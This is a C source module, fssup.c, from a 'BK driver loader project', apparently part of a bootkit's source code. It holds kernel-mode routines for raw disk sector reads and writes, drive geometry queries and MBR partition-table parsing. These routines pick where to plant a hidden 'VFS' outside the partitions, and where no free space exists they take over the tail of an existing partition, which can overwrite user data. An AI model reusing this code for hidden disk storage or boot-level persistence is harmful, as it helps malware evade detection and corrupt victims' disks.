//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2.
//	
// module: fssup.c
// $Revision: 87 $
// $Date: 2012-08-06 19:17:47 +0400 (Пн, 06 авг 2012) $
// description: 
//	Disk and file systems support library.
//  Common sector read\write routines, drive parameters and so on.

#include "main.h"
#include "fssup.h"
#include "bklib.h"


//
//	Reads or writes specified number of sectors from/to the specified buffer.
//
NTSTATUS _stdcall BkSectorIo(
	PUNICODE_STRING	DriveName,		// drive name to read/write sectors from/to
	PCHAR			Buffer,			// bufer to store the data
	ULONG			Length,			// size of the buffer
	ULONGLONG		StartSector,	// starting LBA sector
	ULONG			Count,			// number of sectors to read/write
	ULONG			Flags			// variouse operation flags
	)
{
	HANDLE		hDrive;
	NTSTATUS	ntStatus = STATUS_BUFFER_TOO_SMALL;
	OBJECT_ATTRIBUTES	oa = {0};
	IO_STATUS_BLOCK		IoStatus = {0};
	LARGE_INTEGER		FilePos = {0};
	ULONG	ObjectFlags = OBJ_CASE_INSENSITIVE;

#ifdef _M_AMD64
	if ((ULONG_PTR)&ObjectFlags & 0x8000000000000000)
#else
	if ((ULONG_PTR)&ObjectFlags & 0x80000000)
#endif
		ObjectFlags |= OBJ_KERNEL_HANDLE;

	InitializeObjectAttributes(&oa, DriveName, ObjectFlags, NULL, NULL);

	if ((Count * BIOS_DEFAULT_SECTOR_SIZE) <= Length)
	{
//		ntStatus = ZwCreateFile(&hDrive, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &oa, &IoStatus, NULL, 0, 
//			FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

		ntStatus = ZwOpenFile(&hDrive, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &oa, &IoStatus,
			FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
	
		if (NT_SUCCESS(ntStatus))
		{
			FilePos.QuadPart = (StartSector * BIOS_DEFAULT_SECTOR_SIZE);

			if (Flags & BK_IO_WRITE)
				ntStatus = ZwWriteFile(hDrive, 0, NULL, NULL, &IoStatus, Buffer, (Count*BIOS_DEFAULT_SECTOR_SIZE), &FilePos, NULL);
			else
				ntStatus = ZwReadFile(hDrive, 0, NULL, NULL, &IoStatus, Buffer, (Count*BIOS_DEFAULT_SECTOR_SIZE), &FilePos, NULL);

			ZwClose(hDrive);
		}	// if (hDrive != INVALID_HANDLE_VALUE)
	}	// 	if ((Count * BIOS_DEFAULT_SECTOR_SIZE) <= Length)
 
   return(ntStatus);
}



//
//	Queries the specified disk drive for it's geometry information.
//
NTSTATUS _stdcall BkGetDriveGeometry(
	PUNICODE_STRING DriveName, 
	PVOID			pDriveGeo
	)
{
	NTSTATUS	ntStatus;
	HANDLE		hDevice;           
	OBJECT_ATTRIBUTES	oa;
	IO_STATUS_BLOCK	IoStatus;
	PDISK_GEOMETRY	pDG = (PDISK_GEOMETRY)pDriveGeo;

	InitializeObjectAttributes(&oa, DriveName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	ntStatus = ZwCreateFile(&hDevice, GENERIC_READ | SYNCHRONIZE, &oa, &IoStatus, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 
		FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = ZwDeviceIoControlFile(hDevice, 0, NULL, NULL, &IoStatus, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, pDG, sizeof(DISK_GEOMETRY));
		ZwClose(hDevice);
	}	// if (NT_SUCCESS(ntStatus))

	return (ntStatus);
}


//
//	Searches for the boot sector and calculates where to place VFS area.
//
static VOID	BkCalculateFsArea(
	PDISK_GEOMETRY		pDiskGeo, 
	PPARTITION_TABLE	PTable, 
	PBK_FS_AREA			pFsArea
	)
{
	ULONG	i, StartSector = 0, EndSector = 0, NonNtFirst = 0, NonNtSize = 0;

	// Calculating drive unpartitioned space size
	for (i=0; i<BIOS_MAX_PARTITION_COUNT; i++)
	{
		if (PTable->Entry[i].Descriptor)	
		{
			if (StartSector == 0 || StartSector > PTable->Entry[i].LBAStartSector)
				StartSector = PTable->Entry[i].LBAStartSector;

			if (EndSector < (PTable->Entry[i].LBAStartSector + PTable->Entry[i].PartitionSize))
				EndSector = (PTable->Entry[i].LBAStartSector + PTable->Entry[i].PartitionSize);
		}	// if (PTable->Entry[i].Descriptor)

		if (PTable->Entry[i].Descriptor == BIOS_PARTITION_TYPE_INSTALLABLE)
		{
			// This is a NTFS partition
			if (PTable->Entry[i].ActiveFlag & BIOS_PARTITION_ACTIVE_FLAG)
				// This an active partition, storing it's start sector
				pFsArea->BootSector = (ULONGLONG)PTable->Entry[i].LBAStartSector;
		}
		else
		{			
			if (PTable->Entry[i].Descriptor != 0)
			{
				// This is an existing non-NTFS partition
				NonNtFirst	= PTable->Entry[i].LBAStartSector;
				NonNtSize	= PTable->Entry[i].PartitionSize;
			}
		}
	}	// for (i=0; i<BIOS_MAX_PARTITION_COUNT; i++)

	if (StartSector > BK_FS_SIZE_MIN)
	{
		// There is a space for VFS before the first partition
		pFsArea->StartSector = 1;
		pFsArea->NumberOfSectors = StartSector - 1;
	}
	else	// if (StartSector > BK_FS_SIZE_MIN)
	{
		ULONG	LastSector = (pDiskGeo->Cylinders.LowPart * pDiskGeo->TracksPerCylinder * pDiskGeo->SectorsPerTrack);
		// LastSectior value can be smaller then EndSector (bacause of alingment?). 
		//	In this case using LastSectior as the end of the partitioned space.
		if ((LastSector > EndSector) && ((LastSector - EndSector) > BK_FS_SIZE_MIN))
		{
			// There is a space for VFS after the last partition
			pFsArea->StartSector = (ULONGLONG)(EndSector + 1);
			pFsArea->NumberOfSectors = LastSector - EndSector - 1;
		}
		else
		{
			if (NonNtSize >= BK_FS_SIZE_MIN)
				// Using a part of an existing non-NTFS partition to store the VFS
				pFsArea->StartSector = (ULONGLONG)NonNtFirst + NonNtSize - BK_FS_SIZE_MIN;
			else
				// Trying to reduce last partition size to fit the VFS
				pFsArea->StartSector = (ULONGLONG)LastSector - BK_FS_SIZE_MIN;

			pFsArea->NumberOfSectors = BK_FS_SIZE_MIN;
		}
	}	// else	// if (StartSector > BK_FS_SIZE_MIN)

	pFsArea->BytesPerSector = pDiskGeo->BytesPerSector;
}


//
//	Searches for and allocates space for BK file system partition.
//  Fills BK_FS_AREA structure with partition start sector and sizes.
//
NTSTATUS	BkAllocateFsArea(
	PBK_FS_AREA pFsArea,	//	BK_FS_AREA structure: must have pDeviceName field initizlized
	PVOID	WorkBuffer		//	pre-allocated work buffer: must not be less then BIOS_DEFAULT_SECTOR_SIZE
	)
{

	NTSTATUS	ntStatus;
	PCHAR		Sector = WorkBuffer;
	DISK_GEOMETRY	DiskGeo;
	ULONGLONG		LStartSector = 0;
	PPARTITION_TABLE	PTable;

	do	// not a loop
	{

		if (!(NT_SUCCESS(ntStatus = BkGetDriveGeometry(pFsArea->pDeviceName, &DiskGeo))))
			break;

		if (DiskGeo.BytesPerSector != BIOS_DEFAULT_SECTOR_SIZE)
		{
			// Unsupported sector size
			ntStatus = STATUS_BAD_DEVICE_TYPE; 			
			break;
		}

		// Reading MBR sector
		if (!(NT_SUCCESS(ntStatus = BkReadSectors(pFsArea->pDeviceName, Sector, BIOS_DEFAULT_SECTOR_SIZE, LStartSector, 1))))
			// Reading failed 
			break;

		// Check out we read a right one
		if (*(PUSHORT)(Sector + BIOS_DEFAULT_SECTOR_SIZE - sizeof(USHORT)) != BIOS_MBR_MAGIC)
		{
			// Wrong or corrupt sector loaded
			ntStatus = STATUS_BAD_DEVICE_TYPE;
			break;
		}

		// We have read the Disk Boot sector and now analyzing it's partition table
		PTable = (PPARTITION_TABLE)(Sector + BIOS_PARTITION_TABLE_OFFSET);
		BkCalculateFsArea(&DiskGeo, PTable, pFsArea);

	} while(FALSE);

	return(ntStatus);
}
